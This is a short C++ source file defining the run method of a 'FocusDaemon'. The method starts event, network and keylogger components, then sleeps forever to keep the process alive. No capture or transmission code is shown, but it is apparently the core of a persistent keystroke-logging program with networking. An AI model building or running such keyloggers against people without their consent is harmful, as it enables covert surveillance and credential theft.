//
// Created by Etienne Pasteur on 17/10/2017.
//

#include <FocusDaemon.hpp>

void FocusDaemon::Run() const {
	EventManager->Run();
	NetworkManager->Run();
	KeyLogger->Run();

	//Let's wait indefinitely
	std::this_thread::sleep_until(std::chrono::system_clock::now() + std::chrono::hours((std::numeric_limits<int>::max)()));
}